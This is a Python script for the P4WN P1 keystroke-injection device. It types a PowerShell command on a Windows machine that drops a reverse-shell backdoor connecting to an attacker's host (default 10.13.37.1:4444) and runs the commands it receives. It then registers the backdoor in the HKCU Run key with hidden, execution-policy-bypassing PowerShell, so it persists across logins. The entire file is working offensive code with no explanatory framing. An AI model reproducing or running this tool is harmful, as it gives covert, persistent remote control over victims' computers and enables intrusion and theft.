#!/usr/bin/env python3
import os, sys, time

P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from hid_type import win_r, type_string

def main():
    print("[*] Installing persistence with registry Run key...")

    win_r(); time.sleep(0.5)
    type_string("powershell\n"); time.sleep(1)

    ps = r'''
$payload = '$client=New-Object System.Net.Sockets.TCPClient("P4WN_LHOST",P4WN_LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback + "PS " + (pwd).Path + "> ";$sendbyte=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)};$client.Close();'
$path = "$env:APPDATA\\Microsoft\\Windows\\backdoor.ps1"
$payload | Out-File -Encoding ASCII -FilePath $path
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "powershell -w hidden -ep bypass -f $path" /f
    '''

    # Replace placeholders with environment or default values
    lhost = os.getenv("P4WN_LHOST", "10.13.37.1")
    lport = os.getenv("P4WN_LPORT", "4444")
    ps = ps.replace("P4WN_LHOST", lhost).replace("P4WN_LPORT", str(lport))

    # One-liner encoding
    oneliner = "powershell -nop -w hidden -c \"" + ps.replace('\n', '').replace('"', '`"') + "\""
    type_string(oneliner + "\n")

    print(f"[+] Persistence installed. Backdoor triggers on next login to {lhost}:{lport}")

if __name__ == "__main__":
    main()
